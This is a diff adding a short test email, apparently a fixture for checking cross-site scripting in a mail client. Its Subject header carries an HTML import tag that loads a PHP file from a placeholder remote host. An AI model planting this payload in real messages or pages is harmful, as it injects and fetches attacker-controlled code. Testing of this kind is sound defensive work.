@@ -1,0 +1,7 @@
+From: "Danielle Shaver" <deadpanningaudit's@scientist.com>
+To: zuniart@keshi.com
+Subject: <link rel="import" href="http://xxx.com/1.php">
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
